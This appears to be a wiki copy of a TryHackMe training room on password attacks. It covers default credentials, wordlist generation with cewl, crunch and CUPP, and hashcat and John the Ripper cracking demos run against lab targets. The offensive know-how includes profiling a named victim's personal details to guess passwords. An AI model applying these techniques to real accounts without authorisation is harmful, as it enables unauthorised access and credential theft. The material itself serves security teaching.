<!--
title: Passwords
description: 
published: true
date: 2022-12-17T20:38:35.064Z
tags: 
editor: ckeditor
dateCreated: 2022-11-12T14:27:15.842Z
-->

<h1>Introduction</h1>
<p>This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss:&nbsp;</p>
<ul>
  <li>Password profiling</li>
  <li>Password attacks techniques</li>
  <li>Online password attacks</li>
</ul>
<h3>What is a password?</h3>
<p>Passwords are used as an authentication method for individuals to access computer systems or applications.&nbsp;Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system.&nbsp;Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols.&nbsp;Thus, it is up to the user how they generate passwords!</p>
<p>A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be&nbsp;password,&nbsp;123456,&nbsp;111111,&nbsp;and much more. Here are the&nbsp;<a href="https://techlabuzz.com/top-100-most-common-passwords/">top 100 and most common and seen passwords</a>&nbsp;for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings&nbsp;(ex:&nbsp;*&amp;^%$#@).</p>
<p>Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing.&nbsp;For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy.</p>
<h3>How secure are passwords?</h3>
<p>Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others.</p>
<p>To answer the question:&nbsp;How secure are passwords?&nbsp;depends on various factors.&nbsp;Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the&nbsp;<a href="https://www.techdirt.com/articles/20141204/12032329332/shocking-sony-learned-no-password-lessons-after-2011-psn-hack.shtml">Sony breach</a>&nbsp;in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks.</p>
<h1>Password Attacking Techniques</h1>
<figure class="image image_resized" style="width:535.428px;"><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5d617515c8cd8348d0b4e68f/room-content/964652939b29903c091e3c03f867aaf0.png"></figure>
<p style="text-align:center;"><br>&nbsp;</p>
<p>&nbsp;</p>
<h3>Password Attack Techniques</h3>
<p>In this room, we will discuss the techniques that could be used to perform password attacks.&nbsp;We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks.&nbsp;All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine.</p>
<h3>Password Cracking vs. Password Guessing<br>&nbsp;</h3>
<p>This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing.&nbsp;Finally, we'll demonstrate various tools used for password cracking, including&nbsp;<strong>Hashcat&nbsp;</strong>and&nbsp;<strong>John the Ripper</strong>.</p>
<p>Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network.&nbsp;Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools.</p>
<p>Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network.&nbsp;Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries.&nbsp;The following are major differences between password cracking and password guessing:</p>
<ul>
  <li>Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely.</li>
  <li>Password cracking is a technique performed locally or on systems controlled by the attacker.</li>
</ul>
<h1>Password Profiling #1 - <strong>Default, Weak, Leaked, Combined , and Username Wordlists</strong></h1>
<p>Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists.</p>
<p>Default Passwords</p>
<p>Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out&nbsp;admin:admin, admin:123456, etc. If we know the target device, we can look up the default passwords and try them out.&nbsp;For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server.&nbsp;In that case, there are a couple of possible default passwords we can try:&nbsp;admin:admin or tomcat:admin.</p>
<p>Here are some website lists that provide default passwords for various products.</p>
<ul>
  <li><a href="https://cirt.net/passwords">https://cirt.net/passwords</a></li>
  <li><a href="https://default-password.info/">https://default-password.info/</a></li>
  <li><a href="https://datarecovery.com/rd/default-passwords/">https://datarecovery.com/rd/default-passwords/</a></li>
</ul>
<p>Weak Passwords<br>Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements.&nbsp;These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists :</p>
<ul>
  <li><a href="https://wiki.skullsecurity.org/index.php?title=Passwords">https://wiki.skullsecurity.org/index.php?title=Passwords</a>&nbsp;- This includes the most well-known collections of passwords.</li>
  <li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords">SecLists</a>&nbsp;- A huge collection of all kinds of lists, not only for password cracking.</li>
</ul>
<h3>Leaked Passwords</h3>
<p>Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach.&nbsp;These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost, elitehacker,hak5,&nbsp;Hotmail,&nbsp;PhpBB companies' leaks:</p>
<ul>
  <li><a href="https://github.com/danielmiessler/SecLists/tree/master/Passwords/Leaked-Databases">SecLists/Passwords/Leaked-Databases</a></li>
</ul>
<h3>Combined wordlists<br>&nbsp;</h3>
<p>Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using&nbsp;cat:</p>
<p>cewl</p>
<pre><code class="language-plaintext">cat file1.txt file2.txt file3.txt &gt; combined_list.txt</code></pre>
<p>To clean up the generated combined list to remove duplicated words, we can use&nbsp;sort&nbsp;and&nbsp;uniq&nbsp;as follows:</p>
<p>cewl</p>
<pre><code class="language-plaintext">sort combined_list.txt | uniq -u &gt; cleaned_combined_list.txt</code></pre>
<h3>Customized Wordlists<br>&nbsp;</h3>
<p>Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password!&nbsp;</p>
<p>Tools such as&nbsp;Cewl&nbsp;can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below:</p>
<p>cewl</p>
<pre><code class="language-plaintext">user@thm$ cewl -w list.txt -d 5 -m 5 http://thm.labs</code></pre>
<p>-w&nbsp;will write the contents to a file. In this case, list.txt.</p>
<p>-m 5&nbsp;gathers strings (words) that are 5 characters or more</p>
<p>-d 5&nbsp;is the depth level of web crawling/spidering (default 2)</p>
<p>http://thm.labs&nbsp;is the URL that will be used</p>
<p>As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames.&nbsp;</p>
<p>Apply what we discuss using&nbsp;cewl&nbsp;against&nbsp;https://clinic.thmredteam.com/&nbsp;to parse all words and generate a wordlist with a minimum length of 8. <u>Note that we will be using this wordlist later on with another task!</u></p>
<h3>Username Wordlists</h3>
<p>Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website.&nbsp;For the following example, we'll assume we have a&nbsp;<strong>{first name}</strong>&nbsp;<strong>{last name} (ex: John Smith)</strong> and a method of generating usernames.</p>
<ul>
  <li><strong>{first name}:</strong> john</li>
  <li><strong>{last name}:</strong> smith</li>
  <li><strong>{first name}{last name}:&nbsp; johnsmith&nbsp;</strong></li>
  <li><strong>{last name}{first name}:&nbsp; smithjohn&nbsp;&nbsp;</strong></li>
  <li>first letter of the <strong>{first name}{last name}:&nbsp;jsmith&nbsp;</strong></li>
  <li>first letter of the <strong>{last name}{first name}:&nbsp;sjohn&nbsp;&nbsp;</strong></li>
  <li>first letter of the <strong>{first name}.{last name}:&nbsp;j.smith&nbsp;</strong></li>
  <li>first letter of the <strong>{first name}-{last name}:&nbsp;j-smith&nbsp;</strong></li>
  <li>and so on</li>
</ul>
<p>Thankfully, there is a tool&nbsp;username_generator&nbsp;that could help create a list with most of the possible combinations&nbsp;if we have a first name and last name.</p>
<p>Usernames</p>
<pre><code class="language-plaintext">user@thm$ git clone https://github.com/therodri2/username_generator.git
Cloning into 'username_generator'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (7/7), done.
remote: Total 9 (delta 0), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.

user@thm$ cd username_generator
</code></pre>
<p>Using&nbsp;python3 username_generator.py -h&nbsp;shows the tool's help message and optional arguments.</p>
<p>Usernames</p>
<pre><code class="language-plaintext">user@thm$ python3 username_generator.py -h
usage: username_generator.py [-h] -w wordlist [-u]

Python script to generate user lists for bruteforcing!

optional arguments:
  -h, --help            show this help message and exit
  -w wordlist, --wordlist wordlist
                        Specify path to the wordlist
  -u, --uppercase       Also produce uppercase permutations. Disabled by default</code></pre>
<p>Now let's create a wordlist that contains the full name John Smith to a text file. Then, we'll run the tool to generate the possible combinations of the given full name.</p>
<p>Usernames</p>
<pre><code class="language-plaintext">user@thm$ echo "John Smith" &gt; users.lst
user@thm$ python3 username_generator.py -w users.lst
usage: username_generator.py [-h] -w wordlist [-u]
john
smith
j.smith
j-smith
j_smith
j+smith
jsmith
smithjohn</code></pre>
<p>This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice!</p>
<h1>Password Profiling #2 - <strong>Keyspace Technique and CUPP</strong></h1>
<h3>Keyspace Technique</h3>
<p>Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist.&nbsp;crunch&nbsp;is one of many powerful tools for creating an offline wordlist. With&nbsp;crunch, we can specify numerous options, including min, max, and options as follows:</p>
<p>crunch</p>
<pre><code class="language-plaintext">user@thm$ crunch -h
crunch version 3.6

Crunch can create a wordlist based on the criteria you specify.  
The output from crunch can be sent to the screen, file, or to another program.

Usage: crunch   [options]
where min and max are numbers

Please refer to the man page for instructions and examples on how to use crunch.</code></pre>
<p>The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d.&nbsp;We can use the&nbsp;-o&nbsp;argument and specify a file to save the output to.&nbsp;</p>
<p>crunch</p>
<pre><code class="language-plaintext">user@thm$ crunch 2 2 01234abcd -o crunch.txt
Crunch will now generate the following amount of data: 243 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: xx
crunch: 100% completed generating output</code></pre>
<p>Here is a snippet of the output:</p>
<p>crunch</p>
<pre><code class="language-plaintext">user@thm$ cat crunch.txt
00
01
02
03
04
0a
0b
0c
0d
10
.
.
.
cb
cc
cd
d0
d1
d2
d3
d4
da
db
dc
dd
</code></pre>
<p>It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters:</p>
<p>crunch 8 8 0123456789abcdefABCDEF -o crunch.txt&nbsp;the file generated is 459 GB&nbsp;and contains 54875873536 words.</p>
<p>crunch&nbsp;also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice:</p>
<p>@&nbsp;- lower case alpha characters</p>
<p>,&nbsp;- upper case alpha characters</p>
<p>%&nbsp;- numeric characters</p>
<p>^&nbsp;- special characters including space</p>
<p>For example, if part of the password is known to us, and we know it starts with&nbsp;pass&nbsp;and follows two numbers, we can use the&nbsp;%&nbsp;symbol from above to match the numbers. Here we generate a wordlist that contains&nbsp;pass&nbsp;followed by 2 numbers:</p>
<p>crunch</p>
<pre><code class="language-plaintext">user@thm$  crunch 6 6 -t pass%%
Crunch will now generate the following amount of data: 700 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 100
pass00
pass01
pass02
pass03</code></pre>
<h3>CUPP - Common User Passwords Profiler</h3>
<p>CUPP is an automatic and interactive tool written in Python for creating custom wordlists.&nbsp;For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a&nbsp;1337/leet mode, which substitutes the letters&nbsp;a,&nbsp;i,e,&nbsp;t,&nbsp;o,&nbsp;s,&nbsp;g,&nbsp;z&nbsp;&nbsp;with numbers. For example, replace&nbsp;a&nbsp;&nbsp;with&nbsp;4&nbsp;&nbsp;or&nbsp;i&nbsp;with&nbsp;1. For more information about the tool, please visit the GitHub repo&nbsp;<a href="https://github.com/Mebus/cupp">here</a>.</p>
<p>To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows:</p>
<p>CUPP</p>
<pre><code class="language-plaintext">user@thm$  git clone https://github.com/Mebus/cupp.git
Cloning into 'cupp'...
remote: Enumerating objects: 237, done.
remote: Total 237 (delta 0), reused 0 (delta 0), pack-reused 237
Receiving objects: 100% (237/237), 2.14 MiB | 1.32 MiB/s, done.
Resolving deltas: 100% (125/125), done.
</code></pre>
<p>Now change the current directory to CUPP and run&nbsp;python3 cupp.py&nbsp;or with&nbsp;-h&nbsp;to see the available options.</p>
<p>CUPP</p>
<pre><code class="language-plaintext">user@thm$  python3 cupp.py
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]

usage: cupp.py [-h] [-i | -w FILENAME | -l | -a | -v] [-q]

Common User Passwords Profiler

optional arguments:
  -h, --help         show this help message and exit
  -i, --interactive  Interactive questions for user password profiling
  -w FILENAME        Use this option to improve existing dictionary, or WyD.pl output to make some pwnsauce
  -l                 Download huge wordlists from repository
  -a                 Parse default usernames and passwords directly from Alecto DB. Project Alecto uses purified
                     databases of Phenoelit and CIRT which were merged and enhanced
  -v, --version      Show the version of this program.
  -q, --quiet        Quiet mode (don't print banner)</code></pre>
<p>CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the&nbsp;Enter&nbsp;key.</p>
<p>CUPP</p>
<pre><code class="language-plaintext">user@thm$  python3 cupp.py -i
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

&gt; First Name: 
&gt; Surname: 
&gt; Nickname: 
&gt; Birthdate (DDMMYYYY): 


&gt; Partners) name:
&gt; Partners) nickname:
&gt; Partners) birthdate (DDMMYYYY):


&gt; Child's name:
&gt; Child's nickname:
&gt; Child's birthdate (DDMMYYYY):


&gt; Pet's name:
&gt; Company name:


&gt; Do you want to add some key words about the victim? Y/[N]:
&gt; Do you want to add special chars at the end of words? Y/[N]:
&gt; Do you want to add some random numbers at the end of words? Y/[N]:
&gt; Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to .....txt, counting ..... words.
&gt; Hyperspeed Print? (Y/n)
</code></pre>
<p>ِAs a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows:</p>
<p>CUPP</p>
<pre><code class="language-plaintext">user@thm$  python3 cupp.py -l
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


        Choose the section you want to download:

     1   Moby            14      french          27      places
     2   afrikaans       15      german          28      polish
     3   american        16      hindi           29      random
     4   aussie          17      hungarian       30      religion
     5   chinese         18      italian         31      russian
     6   computer        19      japanese        32      science
     7   croatian        20      latin           33      spanish
     8   czech           21      literature      34      swahili
     9   danish          22      movieTV         35      swedish
    10   databases       23      music           36      turkish
    11   dictionaries    24      names           37      yiddish
    12   dutch           25      net             38      exit program
    13   finnish         26      norwegian


        Files will be downloaded from http://ftp.funet.fi/pub/unix/security/passwd/crack/dictionaries/ repository

        Tip: After downloading wordlist, you can improve it with -w option

&gt; Enter number:</code></pre>
<p>Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing!</p>
<p>Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the&nbsp;-a&nbsp;option.&nbsp;</p>
<p>CUPP</p>
<pre><code class="language-plaintext">user@thm$  python3 cupp.py -a
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Checking if alectodb is not present...
[+] Downloading alectodb.csv.gz from https://github.com/yangbh/Hammer/raw/b0446396e8d67a7d4e53d6666026e078262e5bab/lib/cupp/alectodb.csv.gz ...

[+] Exporting to alectodb-usernames.txt and alectodb-passwords.txt
[+] Done.</code></pre>
<h1>Offline Attacks - <strong>Dictionary and Brute-Force</strong></h1>
<p>This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks.</p>
<h3>Dictionary attack</h3>
<p>A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using&nbsp;hashcat, which is a popular tool to crack hashes.</p>
<p>Let's say that we obtain the following hash&nbsp;f806fc5a2a0d5ba2471600758452799c,&nbsp;and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum:</p>
<p>1- What type of hash is this?<br>2- What wordlist will we be using? Or what type of attack mode could we use?</p>
<p>To identify the type of hash, we could a tool such as&nbsp;hashid&nbsp;or&nbsp;hash-identifier.&nbsp;For this example,&nbsp;hash-identifier&nbsp;believed the possible hashing method is&nbsp;MD5.&nbsp;Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU).</p>
<p>Dictionary attack</p>
<pre><code class="language-plaintext">user@machine$ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...
f806fc5a2a0d5ba2471600758452799c:rockyou

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f806fc5a2a0d5ba2471600758452799c
Time.Started.....: Mon Oct 11 08:20:50 2021 (0 secs)
Time.Estimated...: Mon Oct 11 08:20:50 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 40/40 (100.00%)
Rejected.........: 0/40 (0.00%)
Restore.Point....: 0/40 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: 123456 -&gt; 123123

Started: Mon Oct 11 08:20:49 2021
Stopped: Mon Oct 11 08:20:52 2021</code></pre>
<p>-a 0&nbsp; sets the attack mode to a dictionary attack</p>
<p>-m 0&nbsp; sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes.</p>
<p>f806fc5a2a0d5ba2471600758452799c&nbsp;this option could be a single hash like our example or a file that contains a hash or multiple hashes.</p>
<p>/usr/share/wordlists/rockyou.txt&nbsp;the wordlist/dictionary file for our attack</p>
<p>We run hashcat with --show option to show the cracked value if the hash has been cracked:</p>
<p>Dictionary attack</p>
<pre><code class="language-plaintext">user@machine$ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C /usr/share/wordlists/rockyou.txt --show
f806fc5a2a0d5ba2471600758452799c:rockyou</code></pre>
<p>As a result, the cracked value is rockyou.</p>
<h3>Brute-Force attack</h3>
<p>Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords.</p>
<p>In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from&nbsp;0000&nbsp;to&nbsp;9999&nbsp;to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as&nbsp;admin0,&nbsp;admin1, ..&nbsp;admin9999.</p>
<p>For instance, hashcat has charset options that could be used to generate your own combinations.&nbsp;The charsets can be found in&nbsp;hashcat help options.</p>
<p>Brute-Force attack</p>
<pre><code class="language-plaintext">user@machine$ hashcat --help
 ? | Charset
 ===+=========
  l | abcdefghijklmnopqrstuvwxyz
  u | ABCDEFGHIJKLMNOPQRSTUVWXYZ
  d | 0123456789
  h | 0123456789abcdef
  H | 0123456789ABCDEF
  s |  !"#$%&amp;'()*+,-./:;&lt;=&gt;?@[\]^_`{|}~
  a | ?l?u?d?s
  b | 0x00 - 0xff</code></pre>
<p>The following example shows how we can use&nbsp;hashcat&nbsp;with the brute-force attack mode with a combination of our choice.&nbsp;</p>
<p>Brute-Force attack</p>
<pre><code class="language-plaintext">user@machine$ hashcat -a 3 ?d?d?d?d --stdout
1234
0234
2234
3234
9234
4234
5234
8234
7234
6234
..
..</code></pre>
<p>-a 3&nbsp; sets the attacking mode as a brute-force attack</p>
<p>?d?d?d?d&nbsp;the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999</p>
<p>--stdout&nbsp;print the result to the terminal</p>
<p>Now let's apply the same concept to crack the following&nbsp;MD5 hash:&nbsp;05A5CF06982BA7892ED2A6D38FE832D6&nbsp;a four-digit PIN number.</p>
<p>Brute-Force attack</p>
<pre><code class="language-plaintext">user@machine$ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ?d?d?d?d
05a5cf06982ba7892ed2a6d38fe832d6:2021

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6
Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)
Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)
Guess.Mask.......: ?d?d?d?d [4]
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10000/10000 (100.00%)
Rejected.........: 0/10000 (0.00%)
Restore.Point....: 0/1000 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-10 Iteration:0-10
Candidates.#1....: 1234 -&gt; 6764

Started: Mon Oct 11 10:54:05 2021
Stopped: Mon Oct 11 10:54:08 2021</code></pre>
<h1>Offline Attacks - <strong>Rule-Based</strong></h1>
<h3>Rule-Based attacks</h3>
<p>Rule-Based attacks are also known as&nbsp;hybrid attacks.&nbsp;Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy — for example, manipulating or 'mangling' a password such as 'password':&nbsp;p@ssword,&nbsp;Pa$$word,&nbsp;Passw0rd, and so on.</p>
<p>For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf&nbsp;or&nbsp;/opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for&nbsp;List.Rules to see all the available rules:</p>
<p>Rule-based attack</p>
<pre><code class="language-plaintext">user@machine$ cat /etc/john/john.conf|grep "List.Rules:" | cut -d"." -f3 | cut -d":" -f2 | cut -d"]" -f1 | awk NF
JumboSingle
o1
o2
i1
i2
o1
i1
o2
i2
best64
d3ad0ne
dive
InsidePro
T0XlC
rockyou-30000
specific
ShiftToggle
Split
Single
Extra
OldOffice
Single-Extra
Wordlist
ShiftToggle
Multiword
best64
Jumbo
KoreLogic
T9</code></pre>
<p>We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string&nbsp;tryhackme, to see how we can expand the wordlist. Let's choose one of the rules, the&nbsp;best64&nbsp;rule, which contains the best 64 built-in John rules, and see what it can do!</p>
<p>Rule-based attack</p>
<pre><code class="language-plaintext">user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo
76</code></pre>
<p>--wordlist=&nbsp;to specify the wordlist or dictionary file.&nbsp;</p>
<p>--rules&nbsp;to specify which rule or rules to use.</p>
<p>--stdout&nbsp;to print the output to the terminal.</p>
<p>|wc -l&nbsp; to count how many lines John produced.</p>
<p>By running the previous command, we expand our password list from 1 to 76 passwords.&nbsp;Now let's check another rule, one of the best rules in John,&nbsp;KoreLogic.&nbsp;KoreLogic&nbsp;uses various built-in and custom rules to generate complex password lists. For more information, please visit this website&nbsp;<a href="https://contest-2010.korelogic.com/rules.html">here</a>. Now let's use this rule and check whether the&nbsp;Tryh@ckm3&nbsp;is available in our list!</p>
<p>Rule-based attack</p>
<pre><code class="language-plaintext">user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout |grep "Tryh@ckm3"
Using default input encoding: UTF-8
Press 'q' or Ctrl-C to abort, almost any other key for status
Tryh@ckm3
7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999</code></pre>
<p>The output from the previous command shows that our list has the complex version of&nbsp;tryhackme, which is&nbsp;Tryh@ckm3.&nbsp;Finally, we recommend checking out all the rules and finding one that works the best for you. Many rules apply combinations to an existing wordlist and expand the wordlist to increase the chance of finding a valid password!</p>
<h3>Custom Rules</h3>
<p>John the ripper&nbsp;has a lot to offer. For instance, we can build our own rule(s) and use it at run time while john is cracking the hash or use the rule to build a custom wordlist!</p>
<p>Let's say we wanted to create a custom wordlist from a pre-existing dictionary with custom modification to the original dictionary. The goal is to add special characters (ex: !@#$*&amp;) to the beginning of each word and add numbers 0-9 at the end. The format will be as follows:</p>
<p>[symbols]word[0-9]</p>
<p>We can add our rule to the end of john.conf:</p>
<p>John Rules</p>
<pre><code class="language-plaintext">user@machine$ sudo vi /etc/john/john.conf 
[List.Rules:THM-Password-Attacks] 
Az"[0-9]" ^[!@#$]</code></pre>
<p>[List.Rules:THM-Password-Attacks]&nbsp; specify the rule name THM-Password-Attacks.</p>
<p>Az&nbsp;represents a single word from the original wordlist/dictionary using&nbsp;-p.</p>
<p>"[0-9]"&nbsp;append a single digit (from&nbsp;0&nbsp;to&nbsp;9) to the end of the word. For two digits, we can add&nbsp;"[0-9][0-9]"&nbsp;&nbsp;and so on.&nbsp;&nbsp;</p>
<p>^[!@#$]&nbsp;add a special character at the beginning of each word.&nbsp;^&nbsp;means the beginning of the line/word. Note, changing&nbsp;^&nbsp;to&nbsp;$&nbsp;will append the special characters to the end of the line/word.</p>
<p>Now let's create a file containing a single word&nbsp;password&nbsp;to see how we can expand our wordlist using this rule.</p>
<p>John Rules</p>
<pre><code class="language-plaintext">user@machine$ echo "password" &gt; /tmp/single.lst</code></pre>
<p>We include the name of the rule we created in the John command using the&nbsp;--rules&nbsp;option. We also need to show the result in the terminal. We can do this by using&nbsp;--stdout&nbsp;as follows:</p>
<p>John Rules</p>
<pre><code class="language-plaintext">user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout 
Using default input encoding: UTF-8 
!password0 
@password0 
#password0 
$password0</code></pre>
<p>Now it's practice time to create your own rule.</p>
<p>We recommend using&nbsp;https://clinic.thmredteam.com/&nbsp;to create your custom wordlist.</p>
<p>To generate your wordlist using&nbsp;cewl&nbsp;against the website:</p>
<p>John Rules</p>
<pre><code class="language-plaintext">user@machine$ cewl -m 8 -w clinic.lst https://clinic.thmredteam.com/  </code></pre>
<p>Note that you will also need to generate a username wordlist as shown in Task 3: Password Profiling #1 for the online attack questions.</p>
<h1>Online password attacks</h1>
